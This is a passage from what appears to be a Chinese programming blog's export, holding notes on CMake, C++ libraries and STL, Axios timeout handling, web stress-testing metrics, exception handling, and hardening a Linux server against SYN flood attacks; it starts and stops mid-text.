文件来定制整个编译流程，然后再根据目标用户的平台进一步生成所需的本地化 Makefile 和工程文件，如 Unix 的 Makefile 或 Windows 的 Visual Studio 工程。从而做到“Write once, run everywhere”。显然，CMake 是一个比上述几种 make 更高级的编译配置工具。一些使用 CMake 作为项目架构系统的知名开源项目有 VTK、ITK、KDE、OpenCV、OSG 等。 CMake教程入门给工程起个名字语法： 1project(&lt;PROJECT-NAME&gt; [LANGUAGES] [&lt;language-name&gt;...]) 该指令定义工程名称。例如： 1project(UtilTool) 添加头文件目录INCLUDE_DIRECTORIES语法： 1include_directories([AFTER|BEFORE] [SYSTEM] dir1 [dir2 ...]) 它相当于g++选项中的-I参数的作用，也相当于环境变量中增加路径到CPLUS_INCLUDE_PATH变量的作用。例如： 1include_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;/include) 当头文件分散在不同层次和深度的目录中时，逐个使用include_directories命令添加包含目录十分麻烦，可使用如下方法递归加载各个目录： 12345678910111213MARO(HEADER_DIRECTORIES return_list) FILE(GLOB_RECURSE new_list src/*.h) SET(dir_list &quot;&quot;) FOREACH(file_path $&#123;new_list&#125;) GET_FILENAME_COMPONENT(dir_path $&#123;file_path&#125; PATH) SET(dir_list $&#123;dir_list&#125; $&#123;dir_path&#125;) ENDFOREACH() LIST(REMOVE_DUPLICATES dir_list) SET($&#123;return_list&#125; $&#123;dir_list&#125;)ENDMACRO()HEADER_DIRECTORIES(header_dir_list)include_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;/include $&#123;header_dir_list&#125;) 添加需要链接的库文件目录LINK_DIRECTORIES语法： 1link_directories(directory1 directory2 ...) 它相当于g++命令的-L选项的作用，也相当于环境变量中增加LD_LIBRARY_PATH的路径的作用。 1link_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;/lib) 向当前工程添加存放源文件的子目录ADD_SUBDIRECTORYADD_SUBDIRECTORY用于向当前工程添加存放源文件的子目录，并可以指定中间二进制和目标二进制存放的位置。语法如下： 12ADD_SUBDIRECTORY(source_dir [binary_dir] [EXCLUDE_FROM_ALL]) 上面的例子定义了将 src 子目录加入工程，并指定了编译输出路径为 bin 目录。如果不指定 bin 目录，那么编译的结果都将存放在 build/src 目录。 设置要链接的库文件的名称TARGET_LINK_LIBRARIES语法： 12target_link_libraries(&lt;target&gt; [item1 [item2 [...]]] [[debug|optimized|general] &lt;item&gt;] ...) 该指令的作用为将目标文件与库文件进行链接。例如： 1TARGET_LINK_LIBRARIES(utiltool-example utiltool) 为工程生成目标文件语法： 123add_executable(&lt;name&gt; [WIN32] [MACOSX_BUNDLE] [EXCLUDE_FROM_ALL] source1 [source2 ...]) 例如： 1ADD_EXECUTABLE(utiltool-example examples/ConverterTest.cpp) 为工程生成共享库语法: 123add_library(&lt;name&gt; [STATIC | SHARED | MODULE] [EXCLUDE_FROM_ALL] [source1] [source2] [...]) 该指令的主要作用就是将指定的源文件生成链接文件，然后添加到工程中去。例如： 1ADD_LIBRARY(utiltool SHARED $&#123;UTILTOOL_SOURCES&#125;) 为工程制作简单的安装脚本语法： 123456789install(TARGETS targets... [EXPORT &lt;export-name&gt;] [[ARCHIVE|LIBRARY|RUNTIME|FRAMEWORK|BUNDLE| PRIVATE_HEADER|PUBLIC_HEADER|RESOURCE] [DESTINATION &lt;dir&gt;] [PERMISSIONS permissions...] [CONFIGURATIONS [Debug|Release|...]] [COMPONENT &lt;component&gt;] [OPTIONAL] [NAMELINK_ONLY|NAMELINK_SKIP] ] [...]) 该命令为一个工程生成安装规则。TARGETS格式的install命令规定了安装工程中的目标（targets）的规则。有5中可以被安装的目标文件：ARCHIVE，LIBRARY，RUNTIME，FRAMEWORK，和BUNDLE。静态链接的库文件总是被当做ARCHIVE目标。模块库总是被当做LIBRARY目标。例如： 12345install(TARGETS utiltool RUNTIME DESTINATION bin ARCHIVE DESTINATION lib LIBRARY DESTINATION lib)install(FILES $&#123;UTILTOOL_HEADERS&#125; DESTINATION include) 为工程设置变量语法： 12set(&lt;variable&gt; &lt;value&gt; [[CACHE &lt;type&gt; &lt;docstring&gt; [FORCE]] | PARENT_SCOPE]) 该指令用于给一般变量，缓存变量，环境变量赋值。例如： 12345678910111213# set up versioning.set(BUILD_MAJOR &quot;1&quot;)set(BUILD_MINOR &quot;0&quot;)set(BUILD_VERSION &quot;0&quot;)set(BUILD_VERSION $&#123;BUILD_MAJOR&#125;.$&#123;BUILD_MINOR&#125;.$&#123;BUILD_VERSION&#125;)SET(UTILTOOL_HEADERSsrc/GeodeticConverter.h)SET(UTILTOOL_SOURCESsrc/GeodeticConverter.cpp) 为工程设置预定义宏语法： 1add_definitions(-DFOO -DBAR ...) 该指令添加编译参数。例如： 12# 添加WIN32宏定义add_definitions(-DWIN32) OPTION变量语法： 12option(&lt;option_variable&gt; &quot;help string describing option&quot; [initial value]) 该指令提供一个用户可以任选的选项，可在之后由用户通过CMake的GUI或者命令行进行更改。例如： 1OPTION(UTILTOOL_EXAMPLES &quot;Build the examples&quot; ON) 完整简单示例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283# CMakeList.txt: UtilTool 的 CMake 项目，在此处包括源代码并定义# 项目特定的逻辑。#cmake_minimum_required (VERSION 3.8)project(UtilTool)# set up versioning.set(BUILD_MAJOR &quot;1&quot;)set(BUILD_MINOR &quot;0&quot;)set(BUILD_VERSION &quot;0&quot;)set(BUILD_VERSION $&#123;BUILD_MAJOR&#125;.$&#123;BUILD_MINOR&#125;.$&#123;BUILD_VERSION&#125;)include_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;/include)link_directories($&#123;CMAKE_CURRENT_LIST_DIR&#125;/lib)link_libraries(gsl)# OS and compiler checks. if(UNIX) # linux / normal unix add_definitions(-D_LINUX) if(CYGWIN) # Special Cygwin stuff here elseif(APPLE) # Special Apple stuff here remove_definitions(-D_LINUX) add_definitions(-D_DARWIN) endif()elseif(WIN32) add_definitions(-DWIN32) add_definitions(-D UtilTool_EXPORTS) if(MINGW) # Special MINGW stuff here elseif(MSVC) # Special MSVC stuff here add_definitions(-D_WINSOCK_DEPRECATED_NO_WARNINGS) else() # No idea what it is, but there&apos;s a good chance it&apos;s too weird. MESSAGE( FATAL_ERROR &quot;Using unknown WIN32 compiler... NOT. Please add to build system.&quot; ) endif()endif()SET(UTILTOOL_HEADERSsrc/GeodeticConverter.h)SET(UTILTOOL_SOURCESsrc/GeodeticConverter.cpp)# mark headers as headers...SET_SOURCE_FILES_PROPERTIES( $&#123;UTILTOOL_HEADERS&#125; PROPERTIES HEADER_FILE_ONLY TRUE )# append to sources so that dependency checks work on headersLIST(APPEND UTILTOOL_SOURCES $&#123;UTILTOOL_HEADERS&#125;)OPTION(UTILTOOL_SHARED &quot;Build utiltool lib as shared.&quot; ON)OPTION(UTILTOOL_DEP_ONLY &quot;Build for use inside other CMake projects as dependency.&quot; OFF)# 将源代码添加到此项目的共享库中。if(UTILTOOL_SHARED) ADD_LIBRARY(utiltool SHARED $&#123;UTILTOOL_SOURCES&#125;)endif()# install into configured prefixif(NOT UTILTOOL_DEP_ONLY) install(TARGETS utiltool RUNTIME DESTINATION bin ARCHIVE DESTINATION lib LIBRARY DESTINATION lib) install(FILES $&#123;UTILTOOL_HEADERS&#125; DESTINATION include)else()endif()# TODO: 如有需要，请添加测试并安装目标。OPTION(UTILTOOL_EXAMPLES &quot;Build the examples&quot; ON)if(UTILTOOL_EXAMPLES) ADD_EXECUTABLE(utiltool-example examples/ConverterTest.cpp) TARGET_LINK_LIBRARIES(utiltool-example utiltool)endif() 参考链接 Linux平台编译安装测试JSBSim,by jackhuang. 干货：构建C/C++良好的工程结构,by Froser. 基于CMake构建系统的C++工程框架,by zhongxiao_yao. CMake 手册详解（十九）install指令,by SirDigit. CMake中变量总结,by 拾荒志. cmake使用教程（十）-关于file,by saka. Recursive CMake search for header and source files,by stackoverflow. CMake shared library in subdirectory,by stackoverflow. CMake 语言和语法,by leosocy.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++常用库简介]]></title>
    <url>%2F2019%2F11%2F15%2FCPlusCPlus%E5%B8%B8%E7%94%A8%E5%BA%93%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[为熟练使用C++创建项目，应掌握常用的C++库。现总结常用的C++库如下： 数学库gsl（GNU Scientific Library）:GUN科学运算库Blitz++:高效率的数值计算函数库它的设计目的是希望建立一套既具像C++ 一样方便，同时又比Fortran速度更快的数值计算环境。通常，用C++所写出的数值程序， 比 Fortran慢20%左右，因此Blitz++正是要改掉这个缺点。方法是利用C++的template 技术，程序执行甚至可以比Fortran更快。 MTL(Matrix Template Library):矩阵模板库专注于线性代数相关的计算任务，如各种形式矩阵的生成(对角，共轭，稀疏，对称等)，相关的计算，变换，以及与一维向量的运算。 POOMA一个免费的高性能的C++库，用于处理并行式科学计算。POOMA的面向对象设计方便了快速的程 序开发，对并行机器进行了优化以达到最高的效率，方便在工业和研究环境中使用。 CGAL：计算几何算法库Computational Geometry Algorithms Library的目的是把在计 算几何方面的大部分重要的解决方案和方法以C++库的形式提供给工业和学术界的用户。是一个大型C + +库的几何数据结构和算法，如Delaunay三角网，网格生成，布尔运算的多边形，以及各种几何处理算法。 CGAL是用来在各个领域：计算机图形学，科学可视化，计算机辅助设计与建模，地理信息系统，分子生物学，医学影像学，机器人学和运动规划，和数值方法。 Matlab的开源高仿 Octave旨在解决线性和非线性的数值计算问题。也是跨平台的，源码中用了大量m4语言。 C++符号计算库 GiNaCEigen -目前较活跃线性代数、矩阵、向量操作等运算的C++库。推荐使用。 C/C++数值计算库 mygslmygsl是一个基于GSL库的个性化开源数值计算项目. IMSL软件名称 IMSL C Numerical Library(不兼容vc6 编译器)。 分为统计库和数学库两部分。数学库包含应用数学和特殊函数。IMSL 程序库已成为数值分析解决方案的工业标准。 IMSL 程序库提供最完整与最值得信赖的函数库。 IMSL 数值程序库提供目前世界上最广泛被使用的 IMSL 算法，有超过 370 验证过、最正确与 thread-safe 的数学与统计程序。 IMSL FORTRAN 程序库提供新一代以 FORTRAN 90 为程序库基础的程序，能展现出最佳化的演算法能力应用于多处理器与其它高效能运算系统。 网络库ACE庞大、复杂，适合大型项目。开源、免费，不依赖第三方库，支持跨平台。 AsioAsio基于Boost开发的异步IO库，封装了Socket，简化基于socket程序的开发。 开源、免费，支持跨平台。 POCOPOCO C++ Libraries 提供一套 C++ 的类库用以开发基于网络的可移植的应用程序，功能涉及线程、线程同步、文件系统访问、流操作、共享库和类加载、套接字以及网络协议包括：HTTP、 FTP、SMTP 等；其本身还包含一个 HTTP 服务器，提供 XML 的解析和 SQL 数据库的访问接口。POCO库的模块化、高效的设计及实现使得POCO特别适合嵌入式开发。在嵌入式开发领域，由于C++既适合底层（设备I/O、中断处理等）和高层面向对象开发，越来越流行。 libeventLibevent是一个轻量级的开源高性能网络库，从它的官网标题：libevent-an event notification library就能知道它的机制是采用事件触发，封装了以下三种事件的响应:IO事件,定时器事件,信号事件。select模型来实现跨平台的操作，Windows环境下支持IOCP。Google的开源WEB浏览器Chromium在Mac和Linux版本中，也使用了Libevent，足见该库的质量。 libevlibev和libevent很像，按照作者的介绍，可以作为libevent的替代者，能够提供更高的性能。 libev是一个高性能事件循环，所实现的功能就是一个强大的reactor。 c++ sockets library封装了sockets C API的C++类库。 支持SSL, IPv6, tcp 和 udp sockets, sctp sockets, http协议, 高度可定制的错误处理。 libcurllibcurl是免费的轻量级的客户端网络库，支持DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet, TFTP. 支持SSL, HTTP POST, HTTP PUT, FTP上传, HTTP form上传，代理，cookies, 用户名与密码认证。 如果你开发的是客户端，libcurl是一个不错的选择。 clsocketclsocket是一组轻量级的类，允许开发人员实现基于IP的网络程序。这个编译简单而且用起来也简单，推荐使用。 参考链接 C++数学库,by xigua1234. c++中关于M_PI，M_E的解释和使用，以及参考值,by SYITwin. GSL with CMake build support,by ampl. 在Visual Studio中使用GNU Scientific Library (GSL),by NULL_BOT. 开源免费的C/C++网络库(c/c++ sockets library) 七剑下天山,by 工程师WWW. 值得推荐的C/C++框架和库 (真的很强大),by tibet889. 有哪些值得推荐的c/c++开源框架与库,by 零声学院.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web应用压力测试方法]]></title>
    <url>%2F2019%2F11%2F12%2FWeb%E5%BA%94%E7%94%A8%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Web应用在部署前，最好进行压力测试，以衡量其是否达到设计指标，判断其在何种极限条件下应用功能会失效。下面即介绍软件测试中压力测试，尤其是Web应用压力测试的相关知识。 压力测试压力测试（英语：Stress testing）是针对特定系统或是组件，为要确认其稳定性而特意进行的严格测试。会让系统在超过正常使用条件下运作，然后再确认其结果。进行压力测试的原因可能包括： 确认系统在什么条件下会损坏，以及安全使用条件。 确认预测系统在什么条件下会损坏或其安全使用条件的数学模型是否准确。 确认是否符合预期的规格。 确认失效原因。 确认系统在正常工作条件以外，是否可以正常运作。 软件测试中的压力测试是在超过正常运作条件以外的条件下运作系统，以确认健壮性的方式。压力测试对于关键任务软件格外的重要，但可以适用于各种的软件。压力测试一般较强调软件在高负载下的健壮性、可用性及异常处理，以及哪些在一般使用环境下算是正常行为。 例如一个网站设计容量是100个人同时点击，压力测试就要是采用120个同时点击的条件测试。 性能指标web应用的性能指标主要有响应时间，吞吐量，并发量，性能计数器。 响应时间响应时间指应用执行一个操作需要的时间，即从发出请求到最后收到响应数据所需要的时间。例如：打开一个网站的响应时间、数据库查询一条记录（有索引）的响应时间等等。 实践中通常采用的办法是重复请求，比如一个请求操作重复执行1万次，测试一万次执行的总响应时间之和，然后除以1万，就得到单次请求的响应时间。 吞吐量吞吐量指单位时间内系统处理的请求数量，体现系统的整体处理能力。对于网站，可用“请求数/秒”、“页面数/秒”或“访问人数/天”、“处理业务数/小时”等来衡量。重要指标有TPS(每秒处理的事物数)、QPS(每秒查询的请求数)、HPS（每秒HTTP请求数）等。 并发量并发量指系统能够同时处理的请求的数目，这个数字反映了系统的负载性能。对于网站而言，并发数指网站用户同时提交请求的用户数目。 性能计数器性能计数器描述服务器或操作系统性能的一些数据指标。如System Load、对象与线程数、内存使用、CPU使用、磁盘与网络I/O等使用情况。通过对这些指标设置报警阈值，当监控系统发现性能计数器超过阈值时，就向开发人员和运维报警，及时发现异常并处理。 测试工具压力测试工具有http_load、apache ab、siege。 参考链接 压力测试,by wikipedia. 压力测试 (软件)),by wikipedia. 网站性能测试指标及网站压力测试,by 呦呦鹿鸣. Web 性能压测工具 ApacheBench（ab）使用总结,by juejin.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Axios请求超时处理方法]]></title>
    <url>%2F2019%2F11%2F11%2FAxios%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中。Vue2官方推荐使用Axios执行HTTP请求和处理HTTP响应。Axios具有如下特征： 从浏览器中创建 XMLHttpRequests 从 node.js 创建 http 请求 支持 Promise API 拦截请求和响应 转换请求数据和响应数据 取消请求 自动转换 JSON 数据 客户端支持防御 XSRF 下面介绍使用Axios的拦截功能实现Axios超时错误的统一处理。 Axios基本用法执行 GET 请求： 123456789101112131415161718192021// 为给定 ID 的 user 创建请求axios.get(&apos;/user?ID=12345&apos;) .then(function (response) &#123; console.log(response); &#125;) .catch(function (error) &#123; console.log(error); &#125;);// 可选地，上面的请求可以这样做axios.get(&apos;/user&apos;, &#123; params: &#123; ID: 12345 &#125; &#125;) .then(function (response) &#123; console.log(response); &#125;) .catch(function (error) &#123; console.log(error); &#125;); 执行 POST 请求: 12345678910axios.post(&apos;/user&apos;, &#123; firstName: &apos;Fred&apos;, lastName: &apos;Flintstone&apos; &#125;) .then(function (response) &#123; console.log(response); &#125;) .catch(function (error) &#123; console.log(error); &#125;); 执行多个并发请求: 123456789101112function getUserAccount() &#123; return axios.get(&apos;/user/12345&apos;);&#125;function getUserPermissions() &#123; return axios.get(&apos;/user/12345/permissions&apos;);&#125;axios.all([getUserAccount(), getUserPermissions()]) .then(axios.spread(function (acct, perms) &#123; // 两个请求现在都执行完成 &#125;)); Axios拦截器自定义 axios 实例添加拦截器，在请求或响应被 then 或 catch 处理前拦截它们。 123456789101112131415161718192021222324// create an axios instanceconst service = axios.create(&#123; baseURL: process.env.VUE_APP_BASE_API, // url = base url + request url // withCredentials: true, // send cookies when cross-domain requests timeout: 5000 // request timeout&#125;)// 添加请求拦截器service.interceptors.request.use(function (config) &#123; // 在发送请求之前做些什么 return config; &#125;, function (error) &#123; // 对请求错误做些什么 return Promise.reject(error); &#125;);// 添加响应拦截器service.interceptors.response.use(function (response) &#123; // 对响应数据做点什么 return response; &#125;, function (error) &#123; // 对响应错误做点什么 return Promise.reject(error); &#125;); 拦截timeout错误在Axios响应拦截器中，处理timeout错误，代码如下： 1234567891011service.interceptors.response.use(function (response) &#123; // 对响应数据做点什么 return response; &#125;, function (error) &#123; // 对响应错误做点什么 if(error.message.includes(&apos;timeout&apos;))&#123; // 判断请求异常信息中是否含有超时timeout字符串 console.log(&quot;错误回调&quot;, error); alert(&quot;网络超时&quot;); &#125; return Promise.reject(error); &#125;); 参考链接 Axios使用说明,by yunye. axios超时timeout拦截,by 亲爱的混蛋.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++标准模板库STL入门]]></title>
    <url>%2F2019%2F11%2F10%2FCPlusPlus%E6%A0%87%E5%87%86%E6%A8%A1%E6%9D%BF%E5%BA%93STL%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[最近C++编程中需要管理多个由同一个类实例化的对象，于是想到了C++的标准模板库STL，在此将STL的相关知识记录一下。 STL的来龙去脉STL 历史可以追溯到 1972 年 C 语言在 UNIX 计算机上的首次使用。直到 1994 年，STL 才被正式纳入 C++ 标准中。 标准模板库（STL）是 C ++编程语言的软件库，影响了C ++标准库的许多部分。它提供了四个组件，分别称为算法，容器，仿函数和迭代器。 STL为 C ++提供了一组通用类，例如容器和关联数组，可以与任何内置类型和支持某些基本操作（例如复制和赋值）的任何用户定义类型一起使用。 STL算法独立于容器，从而大大降低了库的复杂性。 STL通过使用模板来实现其结果。这种方法提供的编译时多态性通常比传统的运行时多态性更有效。对现代 C ++编译器进行了调整，以最大程度地减少由于大量使用STL而引起的抽象损失。 STL是创建的第一个C ++通用算法和数据结构库，它牢记四个想法：通用编程，不损失效率的抽象性，冯·诺依曼计算模型和值语义。 STL 组件STL 将“在数据上执行的操作”与“要执行操作的数据分开”，分别以如下概念指代： 容器：包含、放置数据的地方。 迭代器：在容器中指出一个位置、或成对使用以划定一个区域，用来限定操作所涉及到的数据范围。 算法：要执行的操作。 容器容器即用来存储并管理某类对象的集合。例如鱼缸是用来盛放金鱼的容器。标准模板库中容器主要分为序列容器（sequence containers）与关系容器（associative containers）。 序列容器包括： vector list forward_list deque array 关联容器包括： set multiset map multimap unordered_set unordered_multiset unordered_map unordered_multimap 其他类型的容器包括： bitset valarray 迭代器迭代器用于在一个对象群集的元素上进行遍历动作。对象群集可能是容器，也可能是容器的一部分。 迭代器的主要用途是为容器提供一组很小的公共接口。利用这个接口，某项操作可以行进至群集内的下一个元素。 每种容器都提供了各自的迭代器。迭代器了解该容器的内部结构，所以能够正确行进。迭代器的接口和一般指针类似。 迭代器的作用就是提供一个遍历容器内部所有元素的接口，因此迭代器的内部必须保存一个与容器相关联的指针，然后重载各种运算操作来方便遍历，其中最重要的就是∗运算符和-&gt;运算符，以及++，–等可能需要的运算符重载。 根据迭代器的操作方式的不同，迭代器分为五种： 输入迭代器 输出迭代器 前向迭代器 双向迭代器 随机访问迭代器 迭代器的示例代码如下: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main()&#123; vector&lt;int&gt; v; // 定义一个vector容器 v.push_back(1); // 向容器中添加3个元素 v.push_back(2); v.push_back(3); // 遍历向量的元素 vector&lt;int&gt;::iterator b = v.begin(); // 指向容器的第一个元素 vector&lt;int&gt;::iterator e = v.end(); // 指向容器尾元素的下一个位置 // C++11新标准的写法, auto关键字为类型推断，由编译器自动完成 // auto b = v.begin(); // auto e = v.end(); for (vector&lt;int&gt;::iterator iter = b; iter != e; ++iter) &#123; cout &lt;&lt; *iter &lt;&lt; endl; &#125; return 0;&#125; 算法算法用来处理群集内的元素，可以出于不同目的搜寻、排序、修改、使用那些元素。所有容器的迭代器都提供一致的接口，通过迭代器的协助，算法程序可以用于任意容器。 STL 的一个特性是将数据和操作分离。数据由容器类别加以管理，操作则由可定制的算法定义。迭代器在两者之间充当“粘合剂”，以使算法可以和容器交互运作。 STL 的另一个特性即组件可以针对任意型别运作。“标准模板库”这一名称即表示“可接受任意型别”的模板，并且这些型别均可执行必要操作。 仿函数STL中大量运用了仿函数。仿函数具有泛型编程强大的威力，是纯粹抽象概念的例证。 参考链接 STL教程：C++ STL快速入门,by C语言中文网. STL是什么（STL简介）,by C语言中文网. 标准模板库,by wikipedia. C++ STL初识及整理,by thinkChao. C++标准模板库(STL)迭代器的原理与实现,by wutao02.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[异常处理的一些理解]]></title>
    <url>%2F2019%2F11%2F02%2F%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[在编程过程，经常遇到的一个问题是如何优雅地处理异常。下面给出一些对这个问题的答案。 异常处理定义异常处理，是编程语言或计算机硬件里的一种机制，用于处理软件或信息系统中出现的异常状况（即超出程序正常执行流程的某些特殊条件）。 异常处理与错误检测的区别错误检测与异常处理区别在于：错误检测是在正常的程序流中，处理不可预见问题的代码，例如一个调用操作未能成功结束。 某些编程语言有这样的函数：当输入存在非法数据时不能被安全地调用，或者返回值不能与异常进行有效的区别。例如，C语言中的atoi函数（ASCII串到整数的转换）在输入非法时可以返回0。在这种情况下编程者需要另外进行错误检测（可能通过某些辅助全局变量如C的errno），或进行输入检验（如通过正则表达式），或者共同使用这两种方法。 通过异常处理，我们可以对用户在程序中的非法输入进行控制和提示，以防程序崩溃。从进程的视角，硬件中断相当于可恢复异常，虽然中断一般与程序流本身无关。从子程序编程者的视角，异常是很有用的一种机制，用于通知外界该子程序不能正常执行。如输入的数据无效（例如除数是0），或所需资源不可用（例如文件丢失）。如果系统没有异常机制，则编程者需要用返回值来标示发生了哪些错误。 异常处理的原则为了更好的处理异常，应遵循以下三个原则： 具体明确 提早抛出 延迟捕获 具体明确捕获异常时具体明确有利于对异常进行恰当的处理。例如在Java中对同一try块定义多个catch块，以便对每种异常分别进行恰当的处理： 1234567891011121314151617181920File prefsFile = new File(prefsFilename); try&#123; readPreferences(prefsFile);&#125;catch (FileNotFoundException e)&#123; // alert the user that the specified file // does not exist&#125;catch (EOFException e)&#123; // alert the user that the end of the file // was reached&#125;catch (ObjectStreamException e)&#123; // alert the user that the file is corrupted&#125;catch (IOException e)&#123; // alert the user that some other I/O // error occurred&#125; 提早抛出异常堆栈信息提供了导致异常出现的方法调用链的精确顺序，包括每个方法调用的类名，方法名，代码文件名甚至行数，以此来精确定位异常出现的现场。例如： 1234567java.lang.NullPointerExceptionat java.io.FileInputStream.open(Native Method)at java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:103)at jcheckbook.JCheckbook.readPreferences(JCheckbook.java:225)at jcheckbook.JCheckbook.startup(JCheckbook.java:116)at jcheckbook.JCheckbook.&lt;init&gt;(JCheckbook.java:27)at jcheckbook.JCheckbook.main(JCheckbook.java:318) 通过逐步回退跟踪堆栈信息并检查代码，可以确定错误原因。 延迟捕获捕获异常后怎么处理？最不该做的就是什么都不做。空的catch块等于把整个异常丢进黑洞，能够说明何时何处为何出错的所有信息都会永远丢失。把异常写到日志中还稍微好点，至少还有记录可查。但我们总不能指望用户去阅读或者理解日志文件和异常信息。 因此，不要过早捕获异常，而是在合适的层面捕获异常，以便你的程序要么可以从异常中有意义地恢复并继续下去，而不导致更深入的错误；要么能够为用户提供明确的信息，包括引导他们从错误中恢复过来。如果你的方法无法胜任，那么就不要处理异常，把它留到后面捕获和在恰当的层面处理。 参考链接 异常处理,by wikipedia. 如何优雅的处理异常（java）？,by zhihu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux防SYN_Flood攻击的方法]]></title>
    <url>%2F2019%2F10%2F30%2FLinux%E9%98%B2SYN-Flood%E6%94%BB%E5%87%BB%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[最近管理的Linux服务器遭遇了SYN Flood攻击，因此研究一下防范该攻击的方法。 SYN Flood攻击的表现使用ssh登录Linux服务器，在终端中输入netstat -antp能查看到有大量的链接时SYN_RECV状态，说明Linux服务器遭遇了SYN Flood攻击。 netstat常用参数netstat常用参数如下： -a (all)显示所有选项，默认不显示LISTEN相关 -t (tcp)仅显示tcp相关选项 -u (udp)仅显示udp相关选项 -n 拒绝显示别名，能显示数字的全部转化成数字。 -l 仅列出有在 Listen (监听) 的服務状态 -p 显示建立相关链接的程序名 -r 显示路由信息，路由表 -e 显示扩展信息，例如uid等 -s 按各个协议进行统计 -c 每隔一个固定时间，执行该netstat命令。 TCP连接状态 ESTABLISHED 指TCP连接已建立，双方可以进行方向数据传递 CLOSE_WAIT 这种状态的含义其实是表示在等待关闭。当对方close一个SOCKET后发送FIN报文给自己，你系统毫无疑问地会回应一个ACK报文给对方，此时则进入到CLOSE_WAIT状态。 LISTENING 指TCP正在监听端口，可以接受链接 TIME_WAIT 指连接已准备关闭。表示收到了对方的FIN报文，并发送出了ACK报文，就等2MSL后即可回到CLOSED可用状态了。 FIN_WAIT_1 FIN_WAIT_1和 FIN_WAIT_2状态的真正含义都是表示等待对方的FIN报 文。而这两种状态的区别是：FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN 报文，此时该SOCKET即进入到FIN_WAIT_1 状态。而当对方回应ACK 报文后，则进入到FIN_WAIT_2状态，当然在实际的正常情况 下，无论对方何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1状态一般是比较难见到的，而FIN_WAIT_2 状态还有时常常可以用 netstat看到。 FIN_WAIT_2 FIN_WAIT_2 状态下的SOCKET，表示半连接，也即有一方要求close 连接，但另外还告诉对方，我暂时还有点数据需要传送给你，稍后再关闭连接。 LAST_ACK 是被动关闭一方在发送FIN报文后，最后等待对方的ACK报文。当收到ACK报文后，也即可以进入到CLOSED可用状态了 SYNC_RECEIVED 表示接受到了SYN报文，在正常情况下，这个状态是服务器端的SOCKET在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂，基本上用netstat你是很难看到这种状态的，除非你特意写了一个客户端测试程序，故意将三次TCP握手过程中最后一个ACK报文不予发送。 SYNC_SEND 已经主动发出连接建立请求。与SYN_RCVD遥想呼应，当客户端SOCKET执行CONNECT连接时，它首先发送SYN报文，因此也随即它会进入到了SYN_SENT状态，并等待服务端的发送三次握手中的第2个报文。 防范措施首先确保ssh登录密码没有泄露，再修改系统相关配置。 剔出其他登录用户当ssh登录密码泄露，会有其他用户登录，所以需要剔出其他登录用户，再修改密码和系统相关配置。剔出其他登录用户的方法如下： 查看系统在线用户 12345[root@apache ~]# w 14:15:41 up 42 days, 56 min, 2 users, load average: 0.07, 0.02, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root pts/0 116.204.64.165 14:15 0.00s 0.06s 0.04s w root pts/1 116.204.64.165 14:15 2.00s 0.02s 0.02s –bash 查看当前自己占用终端，防止把自己干掉了 12[root@apache ~]# who am i root pts/0 2013-01-16 14:15 (116.204.64.165) 用pkill 命令剔除对方 12# 信号代码 -9 ，表示强制终止[root@apache ~]# pkill -9 -t pts/1 用w命令在看看干掉没。 1234[root@apache ~]# w 14:19:47 up 42 days, 1:00, 1 user, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT root pts/0 116.204.64.165 14:15 0.00s 0.03s 0.00s w 抵御SYN攻击的方法SYN攻击是利用TCP/IP协议3次握手的原理，发送大量的建立连接的网络包，但不实际建立连接，最终导致被攻击服务器的网络队列被占满，无法被正常用户访问。 修改SYN相关系统配置Linux内核提供了若干SYN相关的配置，用命令： sysctl -a | grep syn 看到： 1234net.ipv4.tcp_max_syn_backlog = 1024 net.ipv4.tcp_syncookies = 0net.ipv4.tcp_synack_retries = 5 net.ipv4.tcp_syn_retries = 5 tcp_max_syn_backlog是SYN队列的长度，tcp_syncookies是一个开关，是否打开SYN Cookie 功能，该功能可以防止部分SYN攻击tcp_synack_retries和tcp_syn_retries定义SYN 的重试次数。 加大SYN队列长度可以容纳更多等待连接的网络连接数，打开SYN Cookie功能可以阻止部分 SYN攻击，降低重试次数也有一定效果。 调整上述设置的方法是： 123456789# 增加SYN队列长度到2048：sysctl 